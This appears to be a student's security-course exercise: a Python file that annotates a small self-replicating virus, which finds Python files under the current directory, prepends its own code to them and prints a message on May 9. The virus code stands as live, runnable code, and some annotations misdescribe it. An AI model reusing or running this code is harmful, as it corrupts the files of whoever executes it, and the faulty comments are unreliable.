#!/usr/bin/env python3
## All psuedocode entered by the Analysis Author will be preceeded by "##" at all times in this file.

## Analysis Name:                        Ops Challenge: 301Class14opschallenge-PythonMalwareAnalysis.py
## Analysis Author:                      Ben Hobbs
## Date of Analysis latest revision:     06/16/2023
## Purpose:                              Perform an analysis of the Python-based code.
##                                       Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
##                                       Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
##                                       Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

## Analysis References:    
## https://docs.python.org/3/library/os.html?highlight=os#module-os
## https://docs.python.org/3/library/datetime.html?highlight=datetime#module-datetime
## https://docs.python.org/3/reference/simple_stmts.html#the-return-statement

## Import Libraries
## Declaration of variables
## Declaration of functions
## Main (Body of Analysis): Everything between this line and the termination input of "## End (of Analysis)"" is the subject of this analysis.

## the shebang used here tells us that the attacker is using python3 (as opposed to python)
#!/usr/bin/python3
## These are the two libraries that the attacker references in his python script to write this code. This is our second indicator that this script
## is written in python3. "os" is a library named "Miscellaneous operating system (os) interfaces" that provides a portable way of using operating 
## system dependent functionality. We can see here that "os" is imported here. 
import os
## The other imported library is "datetime" which supplies classes for manipulating dates and times.
import datetime
## This "SIGNATURE" appears to be a variable being loaded. I'm not sure the string "VIRUS" takes any actions at this time.
SIGNATURE = "VIRUS"
## this is the defining of a function entitled "locate(path)"
def locate(path):
    ## These are variables loaded into the function to be called during the function's execution.
    ## The variable "files_targeted" is an array of currently unknown size and elements.
    files_targeted = []
    ## The variable "filelist" is a list of current entities in the "(path)" specified (not including special entries identified with
    ## '.' or '..').
    filelist = os.listdir(path)
    ## This is the beginning of a 'for' loop. This is a conditional that will take different actions depending on certain conditions.
    for fname in filelist:
        ## This line of the conditional asks if "(path+"/"+fname)" points to a file with "fname" in the current path.
        ## If it does, it will continue to take action. If it does not, it will move to the "elif" condition below it.
        if os.path.isdir(path+"/"+fname):
            ## If the above line is true (the condition being met), the next action (listed below) is to load that "fname" (and its entire path)
            ## into the variable "files_targeted" (an array) by extending the array to include the path leading to fname.
            files_targeted.extend(locate(path+"/"+fname))
        ## This line of the conditional is asking if the filename "fname" is equal to ".py"
        elif fname[-3:] == ".py":
        ##  This line below identifies a variable aligned to a Boolean value (False) to be called below in this section
            infected = False
            ## This is the beginning of a 'for' loop within the "elif" condition. If the "fname" at ("path+"/"+fname) is opened
            ## and read...
            for line in open(path+"/"+fname):
                ## ...does it contain "VIRUS" anywhere in it?
                if SIGNATURE in line:
                    ## If it does contain "VIRUS", indicate "True"
                    infected = True
                    ## This line breaks the loop and continues with the function.
                    break
            ## If "fname" is not infected...    
            if infected == False:
                ## then append the path of "fath" to the array of "files_targeted"
                files_targeted.append(path+"/"+fname)
    ## the below "return" command is the final action of this function. In this case, it will return the array "files_targeted"
    return files_targeted
## this is the completion of the above defined function entitled "locate(path)"
##
## This first function appears to search files in a certain location and open each file to see if they are infected and if they
## are not, they are then added to the list (the array 'files_targeted') to be infected...presumably by the end of this script.

## This is the defining of a function entitled "infect(files_targeted)". This function appears designed to infect all entities
## passed to the array 'files_targeted' in the previous function
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
## this is the completion of the above defined function entitled "infect(files_targeted)"
## this is the defining of a function entitled "detonate()"
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
## this is the completion of the above defined function entitled "detonate()"                

# End (of Analysis)
